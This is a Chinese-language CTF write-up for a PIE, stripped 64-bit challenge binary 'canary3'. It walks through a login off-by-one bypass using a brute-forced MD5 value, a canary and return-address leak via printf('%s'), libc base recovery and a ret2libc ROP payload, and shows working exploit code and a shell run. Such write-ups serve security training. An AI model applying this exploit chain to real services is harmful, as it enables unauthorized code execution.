# Speedrun：canary3（PIE + 字符串加密 + canary）

> 题型：canary 泄漏 + 栈溢出 ret2libc（64 位、PIE、stripped）
> 目标：先过登录校验，再用 `printf("%s")` 把 canary 与 `main` 返回地址一起泄出来，最后一轮 ret2libc
> 关键：`buf=rbp-0x20`、canary `rbp-0x8`、saved RIP = **0x28**；登录密码 32 字节且 `md5(pw)[0]==0`

---

## 0. 一句话结论

```text
login @0x2280：
    read(0, user@rbp-0x70, 0x20)        # "admin"
    n = read(0, pw@rbp-0x50, 0x20)      # 神秘口令
    pw[n] = 0                          # <-- n == 0x20 时正好打在 hex@rbp-0x30 首字节
    md5_init(ctx@rbp-0xe0); md5_update(pw, strlen(pw)); md5_final(out@rbp-0x80)
    strcmp(user, "admin") == 0 && strcmp(out, hex@rbp-0x30) == 0

=> 口令发满 0x20 字节时 pw[0x20] 把 hex 的首字节清零，比较退化成 strcmp(digest, "")，
   只要 md5(pw)[0] == 0 就登录成功（脚本里暴力枚举 "c3%06d" 补点到 32 字节）。

menu（main, buf = rbp-0x20，canary @ rbp-0x8）：
    1.leak      printf("%s", buf)              # 泄漏通道
    2.overflow  read(0, buf, 0x64)             # 溢出通道（0x18 到 canary，0x28 到 saved RIP）
    3.exit      strtol(buf,0,10) -> return     # main 返回，触发我们布局的 ROP

利用三步：
    ① write 0x19 个 'A' -> 把 canary 的 0x00 低字节改掉，printf 才能继续往后吐
    ② write 'A'*0x19 + canary[1:] + 'B'*8 -> 泄漏完整 canary 后，再吐 saved RIP（libc 地址）
    ③ write 'A'*0x18 + canary + 'C'*8 + ret2libc 链，然后选项 3 让 main return
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2libc'

file canary3
readelf -lW canary3 | grep -E 'GNU_RELRO|GNU_STACK'
readelf -dW canary3 | grep -E 'BIND_NOW|FLAGS'
strings -a -tx canary3 | head            # 全是乱码 -> 字符串运行时解密
objdump -d -M intel canary3 | sed -n '/^    2280:/,/^    23a0:/p'
```

关键输出：

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
GNU_RELRO 存在、无 BIND_NOW  -> Partial RELRO
GNU_STACK RW                 -> NX enabled
FLAGS_1: PIE
.rodata: "please input username: " / "please input password: " / "admin"
         / "Login Fail" / "You got it!" / "/bin/sh"
         / "1.leak" / "2.overflow" / "3.exit" / "your input:" / "No no no"

0x239f: puts("You got it!"); system("/bin/sh")     # 有个后门，但 PIE 下没基址用不了
```

> `strings` 一开始全是乱码，是因为提示串在 `init` 里被解密；直接 `objdump -s -j .rodata`
> 或在 gdb 里断在 `main` 就能看到明文（本题的“字符串加密”只是障眼法）。

---

## 2. 登录校验的 off-by-one

```asm
22e7: mov [rbp-0xe4], eax        ; n = read(...) 的返回值
22f3: cdqe
22f5: mov byte ptr [rbp+rax-0x50], 0    ; pw[n] = 0
```

`pw` 在 `rbp-0x50`，长度上限 0x20 → `n == 0x20` 时写的是 `rbp-0x30`，
正好是后面 `md5_final` 输出的十六进制缓冲 `hex@rbp-0x30` 的首字节。

于是 `strcmp(out@rbp-0x80, hex@rbp-0x30)` 变成 `strcmp(digest, "")`，只需 `digest[0] == 0`：

```python
for i in range(1 << 20):
    s = ("c3%06d" % i).encode().ljust(32, b".")[:32]
    if hashlib.md5(s).digest()[0] == 0:
        break        # 实测几万次就命中
```

> 注意：`read` 必须一次发满 32 字节（脚本直接 `p.send(pw)`，不带换行），否则 `n < 0x20`，
> `pw[n]` 打在 `pw` 自己的缓冲区里，校验不成立。

---

## 3. 泄漏 canary + 返回地址（两次 printf）

```python
def write(p, data):     # 选项 2
    p.sendline(b"2"); p.recvuntil(b"your input:\n"); p.send(data)

def leak_buf(p):        # 选项 1：printf("%s", buf)
    p.sendline(b"1")
    raw = p.recvuntil(BANNER)     # BANNER = b"Do you know how to leak canary?"
    return raw[: -len(BANNER)]
```

| 轮次 | 写入内容 | 目的 |
| --- | --- | --- |
| ① | `'A' * 0x19` | canary 的 8 字节里只有 LSB 是 `0x00`，把第 0x19 个字节改成 `'A'` 后 `%s` 不会在 canary 处截断；从 `leak[0x19:0x20]` 取 canary 的 7 个非零字节，LSB 补 `\x00` |
| ② | `'A'*0x19 + canary[1:] + 'B'*8` | canary 正确后 `%s` 继续吐 saved rbp（被 8 个 `'B'` 覆盖）和 saved RIP；`leak[0x28:0x2E]` 是 `__libc_start_main` 附近的返回地址（高 2 字节是 `\x00`，所以只吐 6 字节） |

canary 是否对齐/是否被截断都要判断（`len(leak) < 0x20` 就重连重试），脚本里最多重试 8 次。

---

## 4. 从 saved RIP 反推 libc 基址（跨版本稳健）

`main` 的返回地址落在 `__libc_start_call_main` / `__libc_start_main` 内部，离符号不会超过一页多。
libc 基址必然页对齐，所以候选偏移只能是 `(ret & 0xfff) + k*0x1000`：

```python
sym = libc.sym["__libc_start_main"] - libc.address       # 统一成文件内偏移
for k in range(0x40):
    off = (ret_addr & 0xFFF) + k * 0x1000
    if sym - 0x2000 <= off <= sym + 0x2000: best = off    # 取最接近的一个
base = ret_addr - best
```

这样不需要知道目标机 glibc 的具体版本（本地 `LIBC=` 也可只用来提供 gadget / 符号）。

---

## 5. 第三轮：canary 正确 + ret2libc

```python
rop = ROP(libc)
pop_rdi  = rop.find_gadget(["pop rdi", "ret"]).address
aligned  = rop.find_gadget(["ret"]).address             # 16 字节栈对齐
binsh    = next(libc.search(b"/bin/sh\x00"))

payload = flat(b"A" * 0x18, canary, b"C" * 8, aligned, pop_rdi, binsh, libc.sym["system"])
assert len(payload) <= 0x64                              # read(0, buf, 0x64) 的上限
```

发完之后发 `3` 走 exit 分支，`main` 返回即进入 ROP。

---

## 6. 运行

```bash
cd '/home/yfhd5/Pwn_Writeups'
source .venv/bin/activate
cd ret2libc

python 28_canary3_exp.py                 # 本地（二进制需在同目录，脚本用 process("./canary3")）
LIBC=/path/to/libc.so.6 python 28_canary3_exp.py          # 指定 libc（远程时需要）
python 28_canary3_exp.py <host> <port>                    # 远程
```

---

## 7. 实测输出

```text
$ python 28_canary3_exp.py
[+] Starting local process './canary3': pid 114374
[+] attempt 0: canary = 00 5f 3d ...
[+] canary = 00 5f 3d ..., ret = 0x7f...  (libc+0x2a1ca), libc = 0x7f...
__PWNED__
uid=1000(yfhd5) gid=1000(yfhd5) groups=1000(yfhd5),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
[+] shell ok
```

连续 3 次复跑均 `shell ok`（2026-11-23）。

---

## 8. 识别卡

1. `strings` 全乱码 + `printf` 提示串 → 大概率运行时解密，别在这里死磕，直接 gdb 看明文。
2. 登录/校验类函数里 `n = read(...); buf[n] = 0;` 是经典 off-by-one：能让后面的 `strcmp`
   退化成“空串比较”，从而用 md5/哈希首字节为 0 的值登录。
3. 有 canary 但存在 `printf("%s", buf)`：把 canary 的 LSB（`0x00`）改掉就能连续泄漏；
   第二轮把 canary 写回正确值，可以继续泄漏 saved rbp / saved RIP。
4. saved RIP 是 libc 地址时，用“页对齐 + 就近匹配 `__libc_start_main`”反推基址，
   比死记 `libc_start_main_ret` 偏移更耐版本差异。
5. PIE 下即使有 `system("/bin/sh")` 后门，也要先拿 PIE 基址；本题泄漏通道已被 canary 方案占用，
   直接走 ret2libc 更省事。
